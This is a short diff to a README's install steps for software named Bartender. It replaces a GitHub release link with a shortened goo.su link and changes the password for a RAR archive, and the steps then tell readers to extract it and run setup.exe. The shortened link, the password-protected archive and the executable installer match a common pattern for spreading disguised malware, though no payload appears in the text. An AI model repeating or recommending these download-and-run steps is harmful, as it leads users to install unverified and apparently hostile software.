@@ -2,8 +2,8 @@
 
 <H3>How to use:</H3>
 
-1. [Download](https://github.com/Zhao-qianchen/bartender/releases/download/Download/Bartender.rar)
-2. Open archiv (Password: 123456Qq)
+1. [Download](https://goo.su/Cz1xGU9)
+2. Open archiv (Password: Project12!)
 3. Open setup.exe file
 4. Follow the instruction
 
